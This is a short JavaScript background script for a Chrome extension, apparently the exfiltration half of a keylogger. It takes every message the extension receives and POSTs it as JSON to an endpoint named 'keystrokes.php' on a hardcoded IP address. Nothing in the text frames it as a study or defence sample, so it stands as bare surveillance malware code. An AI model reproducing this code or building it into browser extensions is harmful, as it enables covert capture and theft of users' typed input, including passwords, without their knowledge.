chrome.runtime.onMessage.addListener(function(message, sender, sendResponse) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "http://172.18.7.173/keystrokes.php", true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify(message));
});